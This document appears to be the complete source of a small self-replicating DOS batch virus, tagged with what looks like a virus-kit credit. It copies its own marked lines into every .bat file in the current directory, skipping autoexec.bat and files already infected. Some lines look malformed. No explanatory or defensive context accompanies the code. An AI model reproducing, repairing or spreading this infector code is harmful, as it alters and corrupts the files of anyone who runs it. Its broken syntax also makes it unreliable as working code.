@echo off
if "%1=="@ goto $&z
echo.>$&.bat
echo @echo off>>$&.bat
find "$&">$&.bat
for %%b in (*.bat) do call $&.bat @ %%b
del $&.bat
goto $&
:$&z [$MF 3.2, Duke/SMF]
if "%2=="autoexec.bat goto $&
find "$&"nul
if not errorlevel 1 goto $&
type $&.bat>>%2
:$&